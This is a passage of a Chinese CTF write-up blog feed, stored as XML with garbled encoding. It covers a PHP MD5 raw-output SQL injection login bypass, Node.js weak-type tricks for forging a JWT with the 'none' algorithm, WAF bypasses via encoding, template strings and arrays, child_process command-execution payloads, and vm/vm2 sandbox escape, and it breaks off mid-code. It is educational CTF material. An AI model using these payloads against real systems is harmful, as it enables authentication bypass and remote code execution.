æ˜¯md5è¿™ä¸ªå‡½æ•°ç¬¬äºŒä¸ªé€‰é¡¹å°±æ˜¯<code>raw_output</code>ã€‚é»˜è®¤ä¸ºfalseã€‚ä½†æ˜¯å‡å¦‚è®¾ä¸ºtrueçš„è¯MD5æŠ¥æ–‡æ‘˜è¦å°†ä»¥16å­—èŠ‚é•¿åº¦çš„åŸå§‹äºŒè¿›åˆ¶æ ¼å¼è¿”å›ã€‚è¿™æ ·å°±ä¼šå­˜åœ¨ä¸€äº›å¥‡æ€ªçš„å­—ç¬¦ã€‚å› æ­¤ ffifdyop åœ¨ç»è¿‡md5åçš„å†…å®¹æ°å¥½æ˜¯<code>&#39;or&#39;6\xc9]\x99</code>.ç¬¦åˆä¸‡èƒ½å¯†ç çš„è¦æ±‚ã€‚</p><p>æœ¬é¢˜ä¹Ÿæ˜¯åŒæ ·çš„é“ç†ã€‚<code>addslashes</code>çœ‹ä¼¼ä¸èƒ½ç»•è¿‡ã€‚ä½†æ˜¯å› ä¸ºæ‹¼æ¥çš„æ˜¯md5åçš„pass.æ‰€ä»¥åªè¦æ‰¾åˆ°ä¸€ä¸ªæ•°å­—md5åçš„rawå†…å®¹åŒ…å«<code>\</code>å³å¯ã€‚</p><p>payload</p><pre><code>user= OR 1=1#&amp;passwd=128</code></pre><h2 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h2><p>æ—¶éš”ä¸¤ä¸ªæœˆç»ˆäºåˆæŠŠauditlabsçš„å‘å¡«å®Œäº†â€¦â€¦ ä¸å¾—ä¸è¯´é‡Œé¢æ¶µç›–çš„å¾ˆå¤šphpç›¸å…³æ¼æ´éƒ½æ˜¯äº›æ–°æ‰‹åˆšåˆšå…¥é—¨å¹³å°é‡Œçš„é‚£äº›ç»å…¸é¢˜ç›®çš„åŸç†ã€‚å½“åˆæœ‰çš„åŠæ‡‚ä¸æ‡‚ï¼Œç°åœ¨ç®—æ˜¯æŠŠå‘ç»™å¡«ä¸Šäº†ã€‚</p><p>ç„¶åè‡ªå·±æœ€è¿‘æœ‰äº›çº ç»“ã€‚åŸæœ¬å› ä¸ºæ¥è§¦äº†ä¸€äº›å›½é™…èµ›åï¼Œå¼€å§‹æŠ•èº«nodejsä¸pythonç›¸å…³çš„æ¼æ´äº†ã€‚å‡ºäº†å‡ é“é¢˜ä¹Ÿéƒ½åªæ˜¯nodeè·Ÿpython.å”¯ä¸€ä¸€é“phpè¿˜æ˜¯sqlæ³¨å…¥ã€‚å¯èƒ½è‡ªå·±å¿ƒé‡Œå¯¹phpè¿˜æ˜¯è°ˆä¸ä¸Šå–œæ¬¢å§ï¼Œæ²¡æœ‰é’»ç ”ç»†èŠ‚çš„åŠ²å¤´ï¼Œæ›´æ²¡æœ‰è¿›è¡Œç›¸å…³å¼€å‘çš„æƒ³æ³•ã€‚ä½†æœ€è¿‘å¤´ä¸€æ¬¡å®æˆ˜å‘ç°phpä»æ—§æ˜¯ç½‘ç«™å¤§å¤´ä¹‹ä¸€,å¹¶ä¸”ctfæ¯”èµ›ä¸­phpè¿˜æ˜¯æœ‰ç€èƒ½å¤Ÿéš¾å€’äººçš„ç»å¯¹æ°´å‡†ã€‚å‡å¦‚æˆ‘æƒ³è¦ç»§ç»­æå‡å®åŠ›ï¼Œä»æ—§å¾—åœ¨phpä¸‹ä¸‹ä¸å°‘åŠŸå¤«ã€‚æ›´ä½•å†µçœ‹æ¡†æ¶çš„æ´å·²ç»ç®—æœ€è¿‘çš„ä¸€å¤§ä¹è¶£äº†233.</p><p>æ‰€ä»¥è¯´,å¸Œæœ›è‡ªå·±è¿˜æ˜¯èƒ½èŠ±ç‚¹æ—¶é—´å»å¤šçœ‹çœ‹php.æ‰¾æ—¶é—´ç»ƒç»ƒæ‰‹ã€‚æœ€åèƒ½å¤šå‡ºå‡ ä¸ªé¢˜å°±å¥½äº†ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å­¦ä¹ ç¬”è®°-Nodejsç›¸å…³</title>
      <link href="2020/04/20/Nodejs%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8A%80%E5%B7%A7/"/>
      <url>2020/04/20/Nodejs%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8A%80%E5%B7%A7/</url>
      
        <content type="html"><![CDATA[<p>æ‰“ç®—å†™å†™Nodeé‡Œé¢æœ€è¿‘é‡åˆ°çš„çŸ¥è¯†äº†ã€‚<br>ä¸»è¦è¿˜æ˜¯è·Ÿå‘¨æœ«çš„è™ç¬¦æœ‰å…³å§ã€‚ä½œä¸ºäºŒé˜Ÿæ‰“çš„,å­¦æ ¡è™½å¦‚æœŸè¿›å…¥çº¿ä¸‹,ä½†æ˜¯è‡ªå·±è¿™æ¬¡è¿˜æ˜¯æœ‰ç‚¹å°éš¾å—ã€‚åˆ·äº†è¿™ä¹ˆå¤šé¢˜äº†,ç»“æœç¢°åˆ°ä¸¤é“å¹¶ä¸ç®—æ“…é•¿çš„Nodeé¢˜ç›®ã€‚åªåšå‡ºæ¥ç¬¬ä¸€é“é¢˜ã€‚åè¡€çš„æ˜¯ç¬¬äºŒé¢˜å½“æ—¶å¾ˆæ¸…æ¥šè‚¯å®šæ˜¯Node.jsæ²™ç›’é€ƒé€¸ï¼Œä¹ŸæŒ‰ç…§å¤§è‡´æµç¨‹æ„é€ äº†payloadï¼Œç»“æœå°±æ˜¯æ‰“ä¸é€šã€‚èµ›ååŒæ ·çš„payloadä¸Šbuuä¸€è¯•ç¬é—´æˆåŠŸæ‰§è¡Œï¼Œå¿ƒæ€ç‚¸è£‚ã€‚<br>è€å®è¯´Nodeé¢˜ä¹Ÿç®—åšäº†ä¸å°‘æ¬¡äº†,ç›¸å…³çš„æ¼æ´é™¤äº†åŸå‹é“¾æ¯”è¾ƒç†Ÿæ‚‰å…¶ä»–çš„éƒ½ä¸æ€ä¹ˆäº†è§£ã€‚æ‰“ç®—è¿‘æœŸä¸€æ–¹é¢æŠŠç›¸å…³çš„é¢˜ç›®å¤šçœ‹ä¸‹ï¼Œç„¶åå°±æ˜¯åŸºç¡€è¯­æ³•å·©å›ºä¸‹ï¼Œå¹¶ä¸”æ€»ç»“å‡ ä¸ªé‡åˆ°çš„æœ‰ç”¨çš„trick.</p><a id="more"></a><h2 id="å¼±ç±»å‹"><a href="#å¼±ç±»å‹" class="headerlink" title="å¼±ç±»å‹"></a>å¼±ç±»å‹</h2><p>Node.jsä½¿ç”¨çš„æ˜¯javascriptçš„è¯­æ³•ã€‚ç®€å•çš„è¯´ Node.js å°±æ˜¯è¿è¡Œåœ¨æœåŠ¡ç«¯çš„ JavaScriptã€‚æ¯«æ— ç–‘é—®ä½œä¸ºå¼±ç±»å‹çš„javascriptè‡ªç„¶ä¼šæŠŠè¿™ç§ç‰¹æ€§å¸¦åˆ°æœåŠ¡ç«¯,äº§ç”Ÿä¸€äº›å¥‡æ€ªçš„æ•ˆç”¨ã€‚</p><p>ç®€å•çš„å¼±ç±»å‹çš„ä¾‹å­</p><pre><code class="javascript">var a =200;var b =&quot;1&quot;;var c= a + b;console.log(c);//2001</code></pre><p>å­—ç¬¦ä¸²ä¸æ•°å­—ç»ç”±ä¸€ä¸ªäºŒå…ƒè¿ç®—ç¬¦æœ€åè¿”å›çš„æ˜¯æ•°å­—ç±»å‹ã€‚</p><pre><code class="javascript">var obj = {name:&#39;jack&#39;}if(obj){    console.log(1);}</code></pre><p>å¯¹è±¡å¯ä»¥è½¬åŒ–ä¸ºå¸ƒå°”å€¼ã€‚</p><pre><code class="javascript">String.prototype.fn = function(){return this};var a = &#39;hello&#39;;alert(typeof a.fn());alert(a.fn());</code></pre><p>æœ¬è¯¥è¿”å›å¯¹è±¡çš„å‡½æ•°a.fn()éšå¼çš„è½¬æ¢æˆäº†å­—ç¬¦ä¸²â€œhelloâ€æ˜¾ç¤º.</p><p>è¿™æ ·å°±å¯ä»¥å€Ÿç”±è™ç¬¦ç¬¬ä¸€ä¸ªeasy_loginçš„é¢˜ç›®æ¥æ¢è®¨ä¸‹nodejsçš„å¼±ç±»å‹äº†ã€‚</p><p>è¿™é“é¢˜ä¸å‡ºæ„å¤–åº”è¯¥æ˜¯æŒ‰ç…§<a href="https://github.com/justcatthefish/ctf/tree/master/2019-04-25-Angstrom2019/web#cookie-cutter" target="_blank" rel="noopener">https://github.com/justcatthefish/ctf/tree/master/2019-04-25-Angstrom2019/web#cookie-cutter</a> è¿™ä¸ªæ”¹çš„ã€‚åŸé¢˜è·Ÿæ­¤å¤„çš„æ ¡éªŒå‡ ä¹ä¸€æ ·ã€‚é‚£æˆ‘ä»¬æ¥çœ‹çœ‹è™ç¬¦è¿™é¢˜çš„å…³é”®æ ¡éªŒä»£ç ï¼š</p><pre><code class="javascript">const sid = JSON.parse(Buffer.from(token.split(&#39;.&#39;)[1], &#39;base64&#39;).toString()).secretid;console.log(sid)if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) {   throw new APIError(&#39;login error&#39;, &#39;no such secret id&#39;);}const secret = global.secrets[sid];const user = jwt.verify(token, secret, {algorithm: &#39;HS256&#39;});</code></pre><p>å»çœ‹åŸé¢˜å°±èƒ½å­¦åˆ°å§¿åŠ¿ï¼šç”±äºsidæ˜¯è·Ÿæ®ç¬¬äºŒä¸ªâ€™.â€™çš„å†…å®¹å–å‡ºæ¥çš„,å¦‚æœç¨å¾®è®¾è®¡ä¸€ä¸‹ï¼Œæ¯”å¦‚ä»¤å€¼ä¸ºçº¯ä»»æ„å­—æ¯å­—ç¬¦ä¸²ï¼Œå°±èƒ½è¿‡é‚£ä¸ªifçš„åˆ¤æ–­å¹¶ä½¿secrets[sid]è¿”å›undefined.<br>è¿™æ ·é…åˆä¸Šå‰é¢æˆ‘ä»¬ç½®ä¸ºNoneçš„åŠ å¯†æ–¹å¼,å³å¯åœ¨jwt.verifyæ—¶æˆåŠŸè§£ç ã€‚</p><p>æœ¬é¢˜è·ŸåŸé¢˜æœ‰ä¸€ä¸ç‚¹çš„åŒºåˆ«ï¼š<code>!(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0))</code>è¿™æ®µä»£ç çœ‹ä¼¼é™åˆ¶äº†æˆ‘ä»¬åªèƒ½ä¼ æœ‰æ•ˆçš„æ•°ç»„é”®å€¼å³æ•°å­—,ä½†æ˜¯æ•°å­—å­—ç¬¦ä¸²ä¾æ—§æœ‰æ•ˆ</p><pre><code class="javascript">global.secrets=[&#39;supersecretkeyyouwillneverknow&#39;,&#39;2333333&#39;];const sid=&quot;00&quot;;console.log(sid);console.log(global.secrets.length);if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) {    console.log(&quot;no&quot;);}const secret = global.secrets[sid];console.log(secret);</code></pre><p>å‡è®¾è¿™æ˜¯æˆ‘ä»¬å·²ç»æ³¨å†Œè¿‡2ä¸ªç”¨æˆ·çš„æƒ…å†µã€‚ç°åœ¨çœ‹çœ‹æ‰§è¡Œç»“æœ<br><img src="/2020/04/20/Nodejs%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8A%80%E5%B7%A7/0.PNG" class="lazyload" data-srcset="0.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æ²¡æœ‰æŠ¥é”™ã€‚è¯´æ˜æ­£å¦‚æˆ‘ä»¬æ‰€æ–™,è¿›è¡Œ&gt;æˆ–è€…&gt;=è¿™ä¸¤ä¸ªè¿ç®—ç¬¦åå­—ç¬¦ä¸²sidè¢«è½¬æ¢æˆäº†æ•°å€¼ç±»å‹å³ 0(number) 0&lt;1 &amp;&amp; 0&gt;=0<br>åŒæ—¶ä¸‹é¢çš„æ•°ç»„é”®å€¼ä¸å­˜åœ¨,å³secrets[â€œ00â€]ä¸å­˜åœ¨ã€‚<br>æ‰€ä»¥è¿™é¢˜å¯ä»¥æ³¨å†Œnä¸ªç”¨æˆ·,(è‡³å°‘è¦æœ‰ä¸€ä¸ª),ç„¶åä¼ ä¸ªå°äºé•¿åº¦çš„æ•°å­—å­—ç¬¦ä¸²å°±è¡Œã€‚</p><p>å†ç®€å•ä¸€ç‚¹çš„,ç›´æ¥ä¼ ä¸€ä¸ªç©ºå­—ç¬¦ä¸²å½“ç„¶ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚<br>ç©ºæ•°ç»„ä¹Ÿæ˜¯åŒæ ·çš„é“ç†ã€‚ä¸”æ•°ç»„å¦‚æœä¼ å…ƒç´ çš„è¯ä¹Ÿä¼šéµå¾ªè·Ÿä¸Šé¢å­—ç¬¦ä¸²ä¸€æ ·çš„è½¬åŒ–è§„å¾‹<br>æœ€ååŠ å¯†å³å¯</p><pre><code class="python">import jwtpayload = {&#39;secretid&#39;: &quot;00&quot;, &#39;username&#39;: &#39;admin&#39;, &#39;password&#39;: &#39;123&#39;}print(jwt.encode(payload, &#39;&#39;, algorithm=None))</code></pre><p>å€¼å¾—ä¸€æçš„æ˜¯,çº¯å­—æ¯å­—ç¬¦ä¸²ä¸æ•°å­—æ¯”è¾ƒæ—¢ä¸æ»¡è¶³å¤§äºç­‰äºä¹Ÿä¸æ»¡è¶³å°äºç­‰äºï¼Œè¿™ä¹Ÿæ˜¯å›½é™…èµ›åŸé¢˜çš„å°æŠ€å·§ã€‚</p><h2 id="ä½¿ç”¨ç¼–ç -æ¨¡æ¿å­—ç¬¦-æ•°ç»„ç­‰ç»•è¿‡waf"><a href="#ä½¿ç”¨ç¼–ç -æ¨¡æ¿å­—ç¬¦-æ•°ç»„ç­‰ç»•è¿‡waf" class="headerlink" title="ä½¿ç”¨ç¼–ç \æ¨¡æ¿å­—ç¬¦\æ•°ç»„ç­‰ç»•è¿‡waf"></a>ä½¿ç”¨ç¼–ç \æ¨¡æ¿å­—ç¬¦\æ•°ç»„ç­‰ç»•è¿‡waf</h2><p>Node.jsåœ¨ç¼–ç ä¸Šä¹Ÿæœ‰è®¸å¤šå¯ä»¥ç»•è¿‡çš„æŠ€å·§<br>å¸¸è§çš„æ¯”å¦‚å…«è¿›åˆ¶,16è¿›åˆ¶,unicode</p><pre><code class="javascript">&quot;constructor&quot;//oct&quot;\143\157\156\163\164\162\165\143\164\157\162&quot;//hex&quot;\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72&quot;//unicode&quot;\u0063\u006f\u006e\u0073\u0074\u0072\u0075\u0063\u0074\u006f\u0072&quot;</code></pre><p>å‡å¦‚æƒ³è°ƒç”¨å‘½ä»¤</p><pre><code>[][&#39;constructor&#39;][&#39;constructor&#39;](&#39;alert(12345)&#39;)()[].constructor.constructor(&#39;alert(12345)&#39;)()Array.constructor(&#39;alert(12345)&#39;)()</code></pre><p>//ä¸Šé¢ä¸‰ç§å†™æ³•æ˜¯ç­‰ä»·çš„.ä¹‹å‰å…¬ç›Šèµ›NodeGameä¹Ÿæåˆ°è¿‡ã€‚<br><img src="/2020/04/20/Nodejs%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8A%80%E5%B7%A7/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>ä½†æ˜¯è¦æ³¨æ„ä¸€ç‚¹ã€‚è¿™é‡Œå…¶ä»–è¿›åˆ¶ä»¥åŠunicodeæƒ³è¦æˆåŠŸè¢«è§£ææˆå­—ç¬¦ä¸²è¿˜æ˜¯å¾—è¦å•æˆ–åŒå¼•å·ã€‚å¦åˆ™æ— æ³•æˆåŠŸæ‰§è¡Œã€‚é‚£ä¹ˆé‡åˆ°è¿‡æ»¤äº†å•åŒå¼•å·çš„wafæ€ä¹ˆåŠå‘¢ï¼Ÿ</p><p>è¿™é‡Œå†ç»™å‡ºä¸€ç§æ–¹æ³•ã€‚æ¯”å¦‚è¿™æ¬¡è™ç¬¦just_escapeæˆ‘ä½¿ç”¨çš„ç»•è¿‡wafçš„payloadï¼š<code>\u0065val(String.fromCharCode(116,114,121,123,10,32,32,32,32,32,32......))</code></p><p>unicodeçš„ç»•è¿‡ä¸å¿…å¤šè¯´åé¢å­—ç¬¦ä¸²ä½¿ç”¨String.fromCharCodeä¹Ÿæ˜¯xssä¸­ç»å¸¸ç”¨åˆ°çš„æŠ€å·§äº†ã€‚<br>å°±æ˜¯è¿™ä¸ªpayloadåœ¨icqæ‰“ä¸é€šâ€¦buuå¯è¡Œã€‚ä¸ç„¶æˆ‘å·®ç‚¹æ€€ç–‘æ–¹æ³•æ„é€ æœ‰é—®é¢˜äº†â€¦éš¾å—</p><p>è¿˜æœ‰ä¸€ç§æ–¹æ³•æ˜¯ä»èµµå¸ˆå‚…é‚£é‡Œå­¦æ¥çš„æ¨¡æ¿å­—ç¬¦ä¸²çš„æ–¹æ³•,å…¶å®è‡ªå·±ä¹‹å‰ä¹Ÿç”¨è¿‡,å°±æ˜¯æ²¡æ·±åˆ»ç†è§£ã€‚</p><p>ç®€å•æ¥ç”¨å°±æ˜¯ç”¨åå¼•å·ä»£æ›¿åŒå¼•å·.æ‰€ä»¥ä¸Šé¢è¯´åªæœ‰å•åŒå¼•å·æ‰èƒ½è§£æè¿›åˆ¶æ˜¯é”™è¯¯çš„ã€‚<br><img src="/2020/04/20/Nodejs%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8A%80%E5%B7%A7/2.PNG" class="lazyload" data-srcset="2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>ä½†æ˜¯ç»å®éªŒåå‘ç°,åªæœ‰å…«è¿›åˆ¶ä¼šåœ¨è¢«åå¼•å·åµŒå¥—æ—¶å‡ºç°æŠ¥é”™ã€‚è¿™ç‚¹æš‚æ—¶æ²¡æ‰¾åˆ°åŸå› ,æˆ‘çŒœæµ‹å¯èƒ½è·Ÿå…«è¿›åˆ¶è¿‡äºç®€ä¾¿çš„å†™æ³•æœ‰å…³å§ã€‚<br>(jsè¯­æ³•ä¸­åªè¦â€\143â€è¿™ç§å†™æ³•å°±é»˜è®¤ä¸ºå…«è¿›åˆ¶,æœ€å¤§ä¸ºâ€\377â€)</p><p>è€Œæ¨¡æ¿å­—ç¬¦ä¸²çš„å†™æ³•å…è®¸æˆ‘ä»¬è¿›è¡Œå­—ç¬¦æ‹¼æ¥<br><img src="/2020/04/20/Nodejs%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8A%80%E5%B7%A7/3.PNG" class="lazyload" data-srcset="3.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>å½“ç„¶é’ˆå¯¹è™ç¬¦è¿™é“é¢˜è¿˜æœ‰æ•°ç»„ç»•è¿‡çš„ä¸€ä¸ªå§¿åŠ¿,å› ä¸ºåªæ˜¯æ¥å—å‚æ•°ï¼Œç„¶åè¿›è¡Œwafçš„è¾¨åˆ«,ä½¿ç”¨æ•°ç»„è‡ªç„¶ä¹Ÿæ˜¯å¯è¡Œçš„<br>æ„é€ payloadä¸Šç®€å•äº†è®¸å¤šã€‚å…¶å®åŸç†è·Ÿä¸Šé¢å¼±ç±»å‹çš„trickä¸€æ ·ï¼Œå½“æ•°ç»„åˆ†åˆ«ä¸º</p><pre><code class="javascript">[&quot;process&quot;] //waf[&quot;global.process&quot;]  // ç»•è¿‡</code></pre><p>ä¸Šé¢è¢«wafæŒ¡ä½æ˜¾ç„¶æ˜¯å› ä¸ºæ•°ç»„çš„å€¼ç›´æ¥æå–å‡ºæ¥ä¸wafä¸­è¿‡æ»¤çš„æ¯ä¸€ä¸ªå…³é”®å­—æ¯”è¾ƒã€‚ä½†æ˜¯å¦‚æœæ˜¯å®Œæ•´çš„payloadå­—ç¬¦ä¸²æ˜¾ç„¶ä¸ä¼šè¢«ä»»ä½•å•ä¸ªçš„wafå…³é”®å­—åŒ¹é…åˆ°ã€‚</p><p>ä¸‹é¢è¿™ä¸ªpaypalçš„RCEä¾‹å­ä¹Ÿå¯ä»¥å‚è€ƒä¸‹<br><a href="https://artsploit.blogspot.com/2016/08/pprce2.html" target="_blank" rel="noopener">https://artsploit.blogspot.com/2016/08/pprce2.html</a> </p><p>å…³äºæ•°ç»„ç»•è¿‡è¿˜æœ‰ä¸€ä¸ªæœ‰è¶£çš„trickæ¥è‡ªHackTM2020 Draw with us<br><a href="https://xz.aliyun.com/t/7177#toc-4" target="_blank" rel="noopener">https://xz.aliyun.com/t/7177#toc-4</a><br>é‡Œé¢æœ‰ä¸€ä¸ªç‚¹,éœ€è¦è·å–nçš„å€¼ã€‚ä½†æ˜¯nåˆè¢«wafæŒ¡ä½äº†</p><pre><code class="javascript">function checkRights(arr) {  let blacklist = [&quot;p&quot;, &quot;n&quot;, &quot;port&quot;];  for (let i = 0; i &lt; arr.length; i++) {    const element = arr[i];    if (blacklist.includes(element)) {      return false;    }  }  return true;}</code></pre><p>è¿™é‡ŒåŒæ ·å¯ä»¥ä½¿ç”¨æ•°ç»„ç»•è¿‡ã€‚åœ¨jsä¸­,a[[â€œnâ€]]è¿˜æ˜¯è¢«ç†è§£æˆa.n æ‰€ä»¥wafåŒ¹é…ä¸åˆ°,ä½†æ˜¯è¿™æ ·ä»æ—§èƒ½è·å–nè¿™ä¸ªé”®çš„å€¼ã€‚</p><p><img src="/2020/04/20/Nodejs%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8A%80%E5%B7%A7/4.PNG" class="lazyload" data-srcset="4.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br><img src="/2020/04/20/Nodejs%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8A%80%E5%B7%A7/5.PNG" class="lazyload" data-srcset="5.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æ‰€ä»¥ä»¥ä¸Šå‡ ç§å†™æ³•åº”è¯¥å¯ä»¥è§£å†³å¤§å¤šæ•°wafäº†ã€‚</p><h2 id="å‘½ä»¤æ‰§è¡Œä¸æ²™ç›’é€ƒé€¸"><a href="#å‘½ä»¤æ‰§è¡Œä¸æ²™ç›’é€ƒé€¸" class="headerlink" title="å‘½ä»¤æ‰§è¡Œä¸æ²™ç›’é€ƒé€¸"></a>å‘½ä»¤æ‰§è¡Œä¸æ²™ç›’é€ƒé€¸</h2><p>jsé‡Œè°ƒç”¨å‡½æ•°æœ‰ä¸€ä¸ªè‡ªå·±ä¹‹å‰ä¸€ç›´ä¸å¤ªæ‡‚çš„ç‚¹ç»ˆäºå¼„æ˜ç™½äº†ã€‚</p><ul><li>IIFE</li></ul><pre><code class="javascript">(function(){ /* code */ }());(function(){ /* code */ })();</code></pre><p>è¿™æ˜¯IIFEï¼ˆç«‹å³è°ƒç”¨å‡½æ•°è¡¨è¾¾å¼ï¼‰çš„å†™æ³•ã€‚javascriptåœ¨é‡åˆ°å®ƒä¹‹åå°†ç«‹å³æ‰§è¡Œå‡½æ•°ã€‚</p><p>åœ¨ååºåˆ—åŒ–æ¼æ´CVE-2017-5941 ä¸­æœ‰ä¸€å¤„evalçš„æ‹¼æ¥æ‰§è¡Œï¼Œå°±æ˜¯ç”¨åˆ°äº†è¿™ä¸ªã€‚å› ä¸ºevalåçš„è¯­å¥æ˜¯è¢«æ‹¬å·åŒ…è£¹äº†çš„ã€‚å…¶å®è¯´èµ·æ¥ä¹Ÿç®€å•ã€‚åŠ ä¸ªæ‹¬å·è€Œå·²ã€‚ç„¶åå‘½ä»¤åœ¨ååºåˆ—åŒ–æ—¶ç›´æ¥è§¦å‘ã€‚</p><p>ç„¶åå…³äºå‘½ä»¤æ‰§è¡Œçš„å‡ ä¸ªå¸¸è§payload,æ¯”å¦‚åŸå‹é“¾ä¸­å¸¸ç”¨çš„payload</p><pre><code class="javascript">require(&#39;child_process&#39;).exec(&#39;calc&#39;)global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;calc&#39;)global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;calc&#39;)</code></pre><p>å¤§ä½“ä¸Šå°±è¿™å‡ ç§æ‰§è¡Œå‘½ä»¤çš„æ–¹å¼ã€‚å…¶å®ç®€å•è¯´å°±æ˜¯èƒ½è·å–åˆ°child_processè¿™ä¸€æ­¥å°±è¡Œäº†ã€‚å› ä¸ºNode.jsä¸­çš„chile_process.execè°ƒç”¨çš„æ˜¯/bash.shï¼Œå®ƒæ˜¯ä¸€ä¸ªbashè§£é‡Šå™¨ï¼Œå¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚<br>è€Œç›´æ¥requireæœ‰æ—¶å€™æ˜¯è·å–ä¸åˆ°çš„,è¿™ç‚¹pç‰›ä¹Ÿè®²è¿‡äº†ã€‚</p><h3 id="æ²™ç›’é€ƒé€¸"><a href="#æ²™ç›’é€ƒé€¸" class="headerlink" title="æ²™ç›’é€ƒé€¸"></a>æ²™ç›’é€ƒé€¸</h3><p>å…¶å®æ²™ç›’é€ƒé€¸çš„é¢˜ä¹Ÿä¸æ—¶ç¬¬ä¸€æ¬¡åšã€‚ä¹‹å‰HITCONä¹Ÿæœ‰è¿‡è¿™æ ·çš„é¢˜,Confidenceä¸Šä¹Ÿæœ‰æ²™ç›’çš„é¢˜ã€‚ä½†æ˜¯è¿™æ¬¡æ¯”èµ›è¿˜æ˜¯æ‹‰èƒ¯äº†ã€‚è™½ç„¶æ˜¯ç¯å¢ƒçš„é—®é¢˜,ä½†è¦æ˜¯æ¥è§¦å¤šçš„è¯æ¢payloadæ‰“åº”è¯¥æ˜¯å¾ˆè½»æ¾çš„å§ã€‚æ‰€ä»¥è¿˜æ˜¯ç®€å•æ¥è§¦ä¸‹</p><p><a href="https://github.com/patriksimek/vm2/issues" target="_blank" rel="noopener">https://github.com/patriksimek/vm2/issues</a><br>é¦–å…ˆè¦æ‰¾ç°æˆpayloadçš„è¯,ç›´æ¥ä¸Šgithubä¸Šissueæ‰¾å°±å¥½äº†,æœ‰ä½dalaoä¸“ä¸šç ”ç©¶æ²™ç›’é€ƒé€¸,åŸºæœ¬ä¸Šæ‰€æœ‰ç‰ˆæœ¬çš„payloadéƒ½æ˜¯ä»–æ‰¾çš„,ç›´æ¥issueé‡Œæœbreakoutå³å¯ã€‚</p><p>ç„¶åæ˜¯åŸç†ã€‚å…¶å®å°±æ˜¯ç›¸å½“äºç»™ä¸ªæ²™ç›’ç¯å¢ƒã€‚åƒprocessè¿™æ ·çš„å±é™©ä»£ç åŸºæœ¬éƒ½æ˜¯undefinedçš„ã€‚æ‰€ä»¥æ‰æœ‰äº†é€šè¿‡<code>this.constructor.constructor(&#39;return this.process.env&#39;)()</code><br>bypassçš„payloadå‡ºç°ã€‚(è·Ÿpythonsstiæ²™ç›’é€ƒé€¸å·®ä¸å¤šä¸æ˜¯å—)<br>vm2ç›¸æ¯”äºvmç¯å¢ƒé™åˆ¶æ›´åŠ ä¸¥æ ¼ã€‚åŸå…ˆé€šè¿‡thisè·å–constructorçš„æ–¹æ³•ä¸å†è¡Œå¾—é€šã€‚ç›®å‰ä¸»æµçš„æ–¹æ³•ä¸»è¦æ˜¯é€šè¿‡trycatchè¯­å¥æ„é€ ã€‚é€šè¿‡tryè¯­å¥ä¸­æŠ¥é”™è¿›å…¥åˆ°catchå—,å‡å¦‚catchå—æ•æ‰åˆ°çš„é”™è¯¯æ¯”å¦‚æ˜¯ç”±hostæ‰”å‡ºçš„,å°±èƒ½åˆ©ç”¨ä¸åŠ é™åˆ¶çš„hostä¸€æ­¥æ­¥è·å–å±æ€§åˆ°requireè¿›è€Œå‘½ä»¤æ‰§è¡Œã€‚</p><pre><code class="javascript">try {        this.process.removeListener();     }     catch (host_exception) {        console.log(&#39;host 